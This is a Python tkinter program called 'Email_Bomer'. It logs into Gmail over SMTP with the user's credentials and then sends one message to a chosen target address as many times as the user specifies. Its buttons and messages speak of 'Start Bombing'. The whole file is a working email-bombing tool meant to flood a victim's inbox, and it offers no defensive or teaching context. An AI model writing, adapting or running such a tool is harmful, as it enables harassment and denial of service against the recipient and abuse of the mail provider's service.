from tkinter import *

from tkinter import messagebox
import smtplib


from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Email_Bomer:
    def __init__(self):
        super().__init__()
        self.top = Tk()
        # Code to add widgets will go here...
        self.L0 = Label(self.top, text = "Login Screen")
        self.L0.grid(row = 0,column = 0)
        self.L1 = Label(self.top, text = "Email ID")
        self.L1.grid(row = 1,column = 0)
        self.E1 = Entry(self.top, bd = 5)
        self.E1.grid(row = 1,column = 1)
        self.L2 = Label(self.top, text = "Password")
        self.L2.grid(row = 2,column = 0)
        self.E2 = Entry(self.top, bd = 5)
        self.E2.grid(row = 2,column = 1)
        self.B = Button(self.top, text = "login",command = self.login)
        self.B.grid(row = 3,column = 0)
        self.top.mainloop()

    def login(self):
        try:
            self.s = smtplib.SMTP(host='smtp.gmail.com', port=587)
            self.s.starttls()
            self.MY_ADDRESS = self.E1.get()
            PASSWORD = self.E2.get()
            self.s.login(self.MY_ADDRESS, PASSWORD)
            messagebox.showinfo("Success","Login Successful")
            self.new_screen()
        except:
            messagebox.showinfo("Failure","Login failure")

    def new_screen(self):
        self.root = Tk()
        self.root.geometry("500x500") #You want the size of the app to be 500x500
        self.root.resizable(0, 0) 
        self.L3 = Label(self.root, text = "Email ID")
        self.L3.grid(row = 1,column = 0)
        self.email = Entry(self.root, bd = 5)
        self.email.grid(row = 1,column = 1)

        self.L4 = Label(self.root, text = "Count")
        self.L4.grid(row = 2,column = 0)
        self.message_count = Entry(self.root, bd = 5)
        self.message_count.grid(row = 2,column = 1)

        self.L5 = Label(self.root, text = "Subject")
        self.L5.grid(row = 3,column = 0)
        self.email_subject = Entry(self.root, bd = 5)
        self.email_subject.grid(row = 3,column = 1)

        self.L6 = Label(self.root, text = "Message")
        self.L6.grid(row = 4,column = 0)
        self.var = StringVar()
        self.message_box = Text(self.root,height = 10)
        # Message( self.root, textvariable = self.var,bd = 6 )
        self.message_box.grid(row=4,column=1)

        self.submit_button = Button(self.root, text = "Start Bombing",command = self.start_bombing)
        self.submit_button.grid(row = 5,column = 0)
        self.labelText = StringVar()
        self.labelText.set("0 / 0 mail sent")
        self.L7 = Label(self.root, textvariable=self.labelText)
        self.L7.grid(row = 5,column = 1)

        self.root.mainloop()

    def start_bombing(self):
        count = 0
        progress = 0
        try:
            count = int(self.message_count.get())
        except:
            messagebox.showerror("Enter number","Enter only number")
        msg = MIMEMultipart()       # create a message

        # add in the actual person name to the message template
        message = self.message_box.get("1.0",END)

        # Prints out the message body for our sake
        #print(message)

        # setup the parameters of the message
        msg['From']=self.MY_ADDRESS
        msg['To']=self.email.get()
        msg['Subject']= self.email_subject.get()
        
        # add in the message body
        msg.attach(MIMEText(message, 'plain'))
        messagebox.showinfo("Wait","Bombing Has started")

        
        # send the message via the server set up earlier.
        try:
            while progress<count:
                progress = progress+1
                self.s.send_message(msg)
                # self.labelText = "{} / {} mail sent".format(progress,count)
                text_val ="{} / {} mail sent".format(progress,count)
                self.labelText.set(text_val)
                self.root.update_idletasks()
                self.L7.config(text=text_val)
        except:
            messagebox.showerror("Error","enter valid values")
        
    # Terminate the SMTP session and close the connection
        messagebox.showinfo("Success","Bombing completed")
        self.s.quit()


Email_Bomer = Email_Bomer()